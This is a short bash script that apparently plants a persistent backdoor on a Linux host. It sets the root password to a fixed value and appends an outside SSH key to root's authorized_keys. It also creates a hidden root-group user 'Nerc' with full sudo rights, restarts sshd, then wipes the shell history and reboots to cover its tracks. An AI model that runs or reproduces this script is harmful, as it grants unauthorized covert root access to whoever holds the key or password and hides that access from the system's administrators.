#!/bin/bash

echo 'nerc.nerc/1' | passwd --stdin root

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCdq9i6RDTe0wSexJgpdN/mshzvhf9lO4/F7UnhryAfvcAKTYp5+Drvv4KZ8e/rG74jfqs5P1C95GjVh/TzMAAKyl2a8aFJqAl1byPGSLSw9doIT474V5TQRvgxn75BX7TJP2XpIlsUHghnxSaOzKju4+Kh2KtGbmH73HP+BNi8v1YrKA59ZOk9bjOsjc2Hgk/aiyFP9jUKqwW3Lx28eW0RRUTBtT8RhkjYRzQHGY2mvPRd7NKe9qenP1jvRtGe7mW9qd9BIteE0+i2rOwyuQiGT28pTNRhp9+TFoqOG75w8aY9WcyxMBqv7Su70gUfbE/GvrkFRgtRjZukva4GwGKR5CNKUvdaZzbzg+KNgUOHBzi2IMLbQDxWN4YgfdUQFPPUAOOGCOPO/S/OtPS5IqRgGW3azcJOJ0pfkrSTQ7GEj5Ub1XfOQuc5sABI/7kV5k2j0gIzI50an4gvhaXb3LefhI673mU2keAjMTKiBDtPTThLYSgJ/Kj7HDtFSKc4e/8= " >> /root/.ssh/authorized_keys

useradd -G root -d /var/kerberos/Nerc Nerc
echo "nerc.nerc/1" | passwd --stdin Nerc
echo 'Nerc    ALL=(ALL)    ALL' >> /etc/sudoers

systemctl restart sshd

history -c && echo ''> ~/.bash_history && reboot
